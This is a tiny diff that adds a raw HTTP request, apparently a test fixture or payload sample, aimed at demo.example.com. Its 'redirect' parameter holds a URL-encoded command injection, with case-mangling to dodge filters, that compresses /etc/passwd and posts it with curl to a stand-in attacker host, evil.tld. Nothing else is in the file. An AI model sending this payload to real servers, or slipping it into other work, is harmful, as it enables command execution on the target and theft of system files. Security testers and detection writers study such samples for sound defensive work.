@@ -1,0 +1,4 @@
+GET /a?redirect=|%20gZiP%20/eTc/PaSsWd%20|%20CuRl%20-X%20pOsT%20-d%20@-%20HtTp://EvIl.TlD HTTP/1.1
+Host: demo.example.com
+Connection: close
+
